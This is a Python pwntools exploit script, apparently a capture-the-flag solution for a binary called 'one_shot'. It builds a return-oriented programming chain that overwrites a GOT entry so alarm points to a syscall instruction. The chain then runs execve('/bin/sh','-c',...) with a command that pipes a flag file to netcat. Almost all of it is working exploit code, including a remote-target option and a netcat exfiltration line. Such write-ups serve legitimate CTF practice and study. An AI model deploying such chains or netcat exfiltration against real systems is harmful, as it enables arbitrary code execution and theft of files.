#!/usr/bin/python
# Author: mementomori [OpenToAll]
from pwn import *
from time import sleep

local = True
if local:
    s = process("./one_shot")#, env = {"LD_PRELOAD": "./libc-2.24.so"})
else:
    s = remote("178.128.87.12", 31338)
    s.recvuntil('> ')

MAGIC = 0x8a919ff0

ALARM_PLT = 0x400520
PUTS_PLT = 0x400510
ALARM_GOT = 0x601020

POP_RDI = 0x400843 # pop rdi ; ret
POP_RSI_R15 = 0x400841 # pop rsi ; pop r15 ; ret
POP_RBP = 0x4006FB # pop rbp ; ret
SET_EAX = 0x4006F7 # mov eax, [rbp-0xC] ; pop rbx ; pop rbp ; ret
COPY_FUNC = 0x400684 # sequentially copies eax bytes from rdi to rsi
                     # [rbp-0x20] and [rbp-0x1C] need to be equal (or null)

LEN_ADDR = 0x400080 # contains 0x238, can point to any reasonable number > 0x80
TRASH_ADDR = 0x601100 # random writable addr in a nulled area
DEST_ADDR = 0x601600 # where our copied buffer will be

cmd = "cat /home/sherlock/flag | nc 127.0.0.1 1234"
assert len(cmd) < 69
cmd += "\x00" * (69 - len(cmd))

p = p64(MAGIC)
p += "/bin/sh\x00"
p += "-c\x00"
p += cmd

ARGV_ADDR = DEST_ADDR + len(p) - 8
# argv = ["/bin/sh", "-c", cmd, 0]
p += p64(DEST_ADDR) # points to /bin/sh\x00
p += p64(DEST_ADDR + 8) # points to -c\x00
p += p64(DEST_ADDR + 11) # points to cmd
p += p64(0)

EXECVE_SYSCALL_ADDR = DEST_ADDR + len(p) - 8
p += p64(59) # execve syscall number
p += "A" * (0x80-len(p))

# put length (0x238) into eax
p += p64(LEN_ADDR + 0xC) # => rbp
p += p64(SET_EAX) # put [rbp-0xC] = 0x238 into eax
p += p64(0xdeadbeef) # => rbx
p += p64(TRASH_ADDR) # => rbp

# copy eax (0x238) bytes from rdi to rsi
# rdi automagically points to a part of our input buffer
p += p64(POP_RSI_R15)
p += p64(DEST_ADDR - 0x4) # rsi, dest buffer (we don't need first 4 bytes)
p += p64(0xdeadbeef) # => r15
p += p64(COPY_FUNC)
p += p64(0xdeadbeef) # => rbx
p += p64(TRASH_ADDR) # => rbp

# we now have the input buffer starting from "/bin/sh\x00..." at DEST_ADDR
# let's overwrite one byte in alarm GOT to point directly to syscall instruction
# at this point conveniently rax = 1 so we don't have to call SET_EAX again
p += p64(POP_RDI)
p += p64(0x4005e3) # contains byte 0xe5 
p += p64(POP_RSI_R15)
p += p64(ALARM_GOT) # => rsi, alarm GOT
p += p64(0xdeadbeef) # => r15
p += p64(COPY_FUNC) # copy eax (1) bytes from rdi to rsi
p += p64(0xdeadbeef) # => rbx
p += p64(0xdeadbeef) # => rbp

# calling puts will set rdx (envp for execve) to point to some null address
p += p64(POP_RDI)
p += p64(DEST_ADDR)
p += p64(PUTS_PLT)

# set eax to execve syscall number
p += p64(POP_RBP)
p += p64(EXECVE_SYSCALL_ADDR + 0xC)
p += p64(SET_EAX) # put [rbp-0xC] = 68 into eax
p += p64(0xdeadbeef) # => rbx
p += p64(0xdeadbeef) # => rbp

# set rdi to /bin/sh
p += p64(POP_RDI)
p += p64(DEST_ADDR)

# set rsi to argv pointer array
p += p64(POP_RSI_R15)
p += p64(ARGV_ADDR)
p += p64(0xdeadbeef) # =>  r15

# finally call syscall
p += p64(ALARM_PLT)

s.sendline(p)
#sleep(10)
s.interactive()
